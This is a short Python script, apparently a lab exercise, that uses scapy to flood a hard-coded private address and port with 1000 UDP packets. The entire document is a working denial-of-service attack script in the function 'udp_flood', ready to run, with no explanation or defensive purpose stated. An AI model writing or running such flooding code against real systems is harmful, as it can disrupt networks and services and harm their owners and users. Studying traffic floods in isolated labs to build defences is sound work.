from scapy.all import send
from scapy.layers.inet import IP, UDP


def udp_flood(target_ip, target_port, num_packets):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / "payload"
    send(packet, count=num_packets, verbose=1)


target_ip = "192.168.56.1"
target_port = 10001
num_packets = 1000

udp_flood(target_ip, target_port, num_packets)
